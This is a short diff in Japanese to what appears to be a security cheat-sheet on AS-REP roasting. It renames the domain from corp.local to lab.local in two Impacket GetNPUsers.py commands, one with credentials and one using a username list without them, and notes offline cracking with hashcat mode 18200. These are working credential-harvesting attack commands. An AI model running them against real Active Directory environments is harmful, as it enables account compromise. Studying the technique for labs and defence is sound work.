@@ -23,10 +23,10 @@ summary: Kerberos の事前認証が無効なアカウントに対して AS-REP 
 
 ```
 # 認証情報あり（全ユーザーを列挙して対象を自動抽出）
-GetNPUsers.py corp.local/user:'Password123' -dc-ip <DC_IP> -request
+GetNPUsers.py lab.local/user:'Password123' -dc-ip <DC_IP> -request
 
 # 認証情報なし（ユーザー名リストで総当り）
-GetNPUsers.py corp.local/ -dc-ip <DC_IP> -usersfile users.txt -no-pass
+GetNPUsers.py lab.local/ -dc-ip <DC_IP> -usersfile users.txt -no-pass
 ```
 
 取得したハッシュは hashcat（モード 18200）などでオフラインクラックする。
